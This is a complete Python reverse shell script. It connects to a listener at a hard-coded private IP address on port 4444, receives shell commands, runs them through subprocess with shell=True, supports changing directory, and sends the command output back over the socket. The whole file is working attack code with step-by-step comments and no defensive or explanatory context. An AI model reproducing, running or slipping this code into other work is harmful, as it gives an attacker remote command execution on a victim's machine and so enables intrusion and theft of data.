#!/usr/bin/python

import os
import socket
import subprocess

HOST = '192.168.1.100' # The ip of the listener.
PORT = 4444 # The same port as listener.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT)) # Connect to listener.
s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.

while 1: # Start loop.
    data = s.recv(1024).decode("UTF-8") # Recieve shell command.
    if data == "quit": 
        break # If it's quit, then break out and close socket.
    if data[:2] == "cd":
        os.chdir(data[3:]) # If it's cd, change directory.
    # Run shell command.
    if len(data) > 0:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
        output_str = str(stdout_value, "UTF-8") # Format output.
        currentWD = os.getcwd() + "> " # Get current working directory.
        s.send(str.encode(currentWD + output_str)) # Send output to listener.
    
s.close() # Close socket.


